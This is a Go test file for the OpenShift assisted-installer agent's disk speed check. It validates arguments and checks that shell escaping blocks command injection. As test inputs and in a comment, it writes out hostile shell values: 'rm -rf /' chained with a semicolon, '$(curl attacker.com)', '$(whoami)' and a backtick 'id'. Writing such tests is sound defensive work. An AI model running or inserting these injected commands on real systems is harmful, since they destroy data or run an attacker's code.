package actions

import (
	"strings"

	. "github.com/onsi/ginkgo"
	. "github.com/onsi/gomega"
	"github.com/openshift/assisted-installer-agent/src/config"
	"github.com/openshift/assisted-service/models"
)

var _ = Describe("dhcp leases", func() {
	var param string
	var timeout string

	BeforeEach(func() {
		param = "{\"path\":\"/dev/disk/by-path/pci-0000:00:06.0\"}"
		timeout = "5.25"
	})

	It("disk performance", func() {
		action, err := New(&config.AgentConfig{}, models.StepTypeInstallationDiskSpeedCheck, []string{param, timeout})
		Expect(err).NotTo(HaveOccurred())

		args := action.Args()
		command := action.Command()
		Expect(command).To(Equal("sh"))
		paths := []string{
			"/var/log",
			"/run/systemd/journal/socket",
			"/dev",
		}
		verifyPaths(strings.Join(args, " "), paths)
		Expect(args[len(args)-1]).To(ContainSubstring(timeout))

	})

	It("disk performance input failures", func() {
		By("bad model")
		_, err := New(&config.AgentConfig{}, models.StepTypeInstallationDiskSpeedCheck, []string{"echo aaaa", timeout})
		Expect(err).To(HaveOccurred())

		By("bad timeout")
		_, err = New(&config.AgentConfig{}, models.StepTypeInstallationDiskSpeedCheck, []string{param, "aaaaa"})
		Expect(err).To(HaveOccurred())

		By("One arg")
		_, err = New(&config.AgentConfig{}, models.StepTypeInstallationDiskSpeedCheck, []string{param})
		Expect(err).To(HaveOccurred())

		By("Three args")
		_, err = New(&config.AgentConfig{}, models.StepTypeInstallationDiskSpeedCheck, []string{param, timeout, "aaa"})
		Expect(err).To(HaveOccurred())
	})
})

// =============================================================================
// COMMAND INJECTION PREVENTION TESTS
// =============================================================================
// These tests validate that command injection attacks are prevented.
// Each test case represents a real attack pattern:
//
//   - "; rm -rf /"         : Command chaining - attacker appends destructive command
//   - "$(curl attacker.com)": Command substitution - attacker executes arbitrary commands
//   - "`id`"               : Backtick execution - alternative command substitution
//   - "'; rm -rf /; echo '" : Quote escape - attacker breaks out of quoted string
//
// The tests verify that these patterns are safely quoted by shellescape and
// not executed as shell commands. This is critical for CWE-78 prevention.
// =============================================================================
var _ = Describe("disk performance command injection prevention", func() {
	var timeout string
	var agentConfig *config.AgentConfig

	BeforeEach(func() {
		timeout = "5.25"
		agentConfig = &config.AgentConfig{}
		agentConfig.AgentVersion = "test-image:latest"
	})

	It("escapes shell metacharacters in device path", func() {
		// This test verifies that shell metacharacters are properly escaped
		// to prevent command injection attacks (CWE-78: OS Command Injection)
		action := &diskPerfCheck{
			args:        []string{"{\"path\":\"/dev/sda; rm -rf /\"}", timeout},
			agentConfig: agentConfig,
		}

		args := action.Args()
		Expect(args).To(HaveLen(2))
		Expect(args[0]).To(Equal("-c"))

		// The command should contain properly escaped path (single quotes around the JSON)
		// shellescape.Quote wraps strings with special characters in single quotes
		cmdStr := args[1]
		Expect(cmdStr).To(ContainSubstring("disk_speed_check"))

		// Verify the dangerous input is properly quoted with single quotes
		// shellescape wraps strings containing special characters in single quotes
		// so the semicolon cannot be interpreted as a command separator
		Expect(cmdStr).To(ContainSubstring("disk_speed_check '"))
		// The malicious input should be enclosed in single quotes, making it a literal string
		Expect(cmdStr).To(MatchRegexp(`disk_speed_check '.*; rm -rf /.*'`))
	})

	It("escapes command substitution attempts", func() {
		action := &diskPerfCheck{
			args:        []string{"{\"path\":\"/dev/sda$(whoami)\"}", timeout},
			agentConfig: agentConfig,
		}

		args := action.Args()
		cmdStr := args[1]

		// The $() should be escaped/quoted, not interpreted
		Expect(cmdStr).To(ContainSubstring("disk_speed_check"))
		// Verify the command substitution is quoted
		Expect(cmdStr).NotTo(MatchRegexp(`\$\(whoami\)[^'"]`))
	})

	It("escapes backtick command substitution", func() {
		action := &diskPerfCheck{
			args:        []string{"{\"path\":\"/dev/sda`id`\"}", timeout},
			agentConfig: agentConfig,
		}

		args := action.Args()
		cmdStr := args[1]

		// The backticks should be escaped/quoted, not interpreted
		Expect(cmdStr).To(ContainSubstring("disk_speed_check"))
	})

	It("escapes single quote injection attempts", func() {
		action := &diskPerfCheck{
			args:        []string{"{\"path\":\"/dev/sda'; rm -rf /; echo '\"}", timeout},
			agentConfig: agentConfig,
		}

		args := action.Args()
		cmdStr := args[1]

		// The single quotes should be escaped
		Expect(cmdStr).To(ContainSubstring("disk_speed_check"))
	})

	It("handles valid device paths correctly", func() {
		action := &diskPerfCheck{
			args:        []string{"{\"path\":\"/dev/sda\"}", timeout},
			agentConfig: agentConfig,
		}

		args := action.Args()
		cmdStr := args[1]

		Expect(cmdStr).To(ContainSubstring("disk_speed_check"))
		Expect(cmdStr).To(ContainSubstring("/dev/sda"))
		Expect(cmdStr).To(ContainSubstring("timeout"))
		Expect(cmdStr).To(ContainSubstring(timeout))
	})

	It("outputs sentinel message when container is already running", func() {
		// This test verifies that when the disk_performance container is already running,
		// the command outputs a sentinel message "disk_performance:already_running"
		// instead of silently returning empty stdout with exit code 0.
		// This allows callers to distinguish between a successful disk speed check
		// and a skipped check due to an already running container.
		action := &diskPerfCheck{
			args:        []string{"{\"path\":\"/dev/sda\"}", timeout},
			agentConfig: agentConfig,
		}

		args := action.Args()
		Expect(args).To(HaveLen(2))
		Expect(args[0]).To(Equal("-c"))

		cmdStr := args[1]

		// Verify the check for already running container is present
		Expect(cmdStr).To(ContainSubstring("podman ps --quiet --filter"))
		Expect(cmdStr).To(ContainSubstring("name=disk_performance"))

		// Verify the sentinel message is echoed when container is already running
		Expect(cmdStr).To(ContainSubstring("echo 'disk_performance:already_running'"))

		// Verify the overall command structure: check || run
		// The check should output sentinel if container exists, otherwise run the disk check
		Expect(cmdStr).To(MatchRegexp(`test ! -z "\$id" && echo 'disk_performance:already_running' \|\|`))
	})
})
